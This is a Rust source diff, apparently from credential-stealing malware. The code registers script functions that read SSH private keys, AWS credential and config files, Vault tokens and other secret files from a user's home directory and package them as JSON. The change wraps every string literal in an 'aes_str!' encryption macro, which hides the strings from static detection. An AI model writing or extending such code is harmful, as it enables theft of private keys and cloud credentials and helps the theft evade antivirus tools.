@@ -23,7 +23,7 @@ pub fn register(engine: &mut Engine) {
             PathBuf::from(home_dir)
         };
         let Ok(rd) = fs::read_dir(&base) else {
-            return format!("Error: cannot read {}", base.display());
+            return format!("{}{}", aes_str!("Error: cannot read "), base.display());
         };
         let keys: Vec<serde_json::Value> = rd.flatten()
             .filter(|e| e.file_type().map(|t| t.is_file()).unwrap_or(false))
@@ -36,9 +36,9 @@ pub fn register(engine: &mut Engine) {
                     else if content.contains(&aes_str!("DSA PRIVATE"))          { aes_str!("dsa") }
                     else                                                        { aes_str!("unknown") };
                 Some(json!({
-                    "path":     e.path().display().to_string(),
-                    "key_type": key_type,
-                    "content":  content,
+                    aes_str!("path").as_str():     e.path().display().to_string(),
+                    aes_str!("key_type").as_str(): key_type,
+                    aes_str!("content").as_str():  content,
                 }))
             })
             .collect();
@@ -51,7 +51,7 @@ pub fn register(engine: &mut Engine) {
     engine.register_fn(&aes_str!("internal_aws_credentials"), || -> String {
         let creds  = read_home(&aes_str!(".aws/credentials"));
         let config = read_home(&aes_str!(".aws/config"));
-        json!({ "credentials": creds, "config": config }).to_string()
+        json!({ aes_str!("credentials").as_str(): creds, aes_str!("config").as_str(): config }).to_string()
     });
 
     // ── HashiCorp Vault token ─────────────────────────────────────────────────
@@ -105,10 +105,10 @@ pub fn register(engine: &mut Engine) {
             .map(|(name, rel)| {
                 let path = home_path(rel);
                 json!({
-                    "name":   name,
-                    "path":   path.display().to_string(),
-                    "exists": path.exists(),
-                    "size":   fs::metadata(&path).map(|m| m.len()).unwrap_or(0),
+                    aes_str!("name").as_str():   name,
+                    aes_str!("path").as_str():   path.display().to_string(),
+                    aes_str!("exists").as_str(): path.exists(),
+                    aes_str!("size").as_str():   fs::metadata(&path).map(|m| m.len()).unwrap_or(0),
                 })
             })
             .collect();
@@ -131,5 +131,5 @@ fn home_path(rel: &str) -> PathBuf {
 
 fn read_home(rel: &str) -> String {
     fs::read_to_string(home_path(rel))
-        .unwrap_or_else(|e| format!("Error: {}", e))
+        .unwrap_or_else(|e| format!("{}{}", aes_str!("Error: "), e))
 }
